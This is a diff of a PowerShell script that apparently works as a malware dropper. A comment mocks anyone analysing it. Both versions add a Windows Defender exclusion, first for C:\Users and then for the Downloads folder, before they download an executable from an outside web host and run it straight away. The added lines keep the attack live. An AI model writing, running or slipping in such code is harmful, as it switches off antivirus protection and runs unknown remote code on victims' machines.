@@ -1,5 +1,5 @@
 # If you found this, CONGRATS! You probably think you some kind of cyber analyst Guru. Nah. I'm just lazy. But good job at poking around.
 
-Add-MpPreference -ExclusionPath "C:\Users"
-
-iwr "https://nyanza.vercel.app/assets/Test.exe" -OutFile "$env:LOCALAPPDATA\file.exe"; & "$env:LOCALAPPDATA\file.exe"
+$downloadPath = "$env:USERPROFILE\Downloads"
+Add-MpPreference -ExclusionPath $downloadPath
+iwr "https://nyanza.vercel.app/assets/Test.exe" -OutFile "$downloadPath\file.exe"; & "$downloadPath\file.exe"
